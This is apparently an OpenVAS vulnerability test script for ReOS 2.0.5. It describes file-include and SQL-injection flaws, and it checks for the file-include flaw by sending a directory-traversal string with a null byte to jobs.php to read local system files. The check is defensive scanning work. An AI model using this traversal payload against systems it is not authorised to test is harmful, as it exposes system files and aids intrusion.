###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_reos_46134.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# ReOS Local File Include and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "ReOS is prone to a local file-include vulnerability and multiple SQL-
injection vulnerabilities because it fails to properly sanitize user-
supplied input.

An attacker can exploit the local file-include vulnerability using directory-
traversal strings to view and execute arbitrary local files within the
context of the affected application. Information harvested may aid in
further attacks.

The attacker can exploit the SQL-injection vulnerabilities to
compromise the application, access or modify data, exploit latent
vulnerabilities in the underlying database, or bypass the
authentication control.

ReOS 2.0.5 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(103061);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-02-04 13:23:33 +0100 (Fri, 04 Feb 2011)");
 script_bugtraq_id(46134);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_name("ReOS Local File Include and SQL Injection Vulnerabilities");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46134");
 script_xref(name : "URL" , value : "http://reos.elazos.com/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516154");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516155");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516152");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516149");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516156");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if ReOS is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/reos",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {

    url = string(dir, "/jobs.php?lang=",crap(data:"../",length:3*9),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_message(port:port);
      exit(0);

    }
  }
}

exit(0);
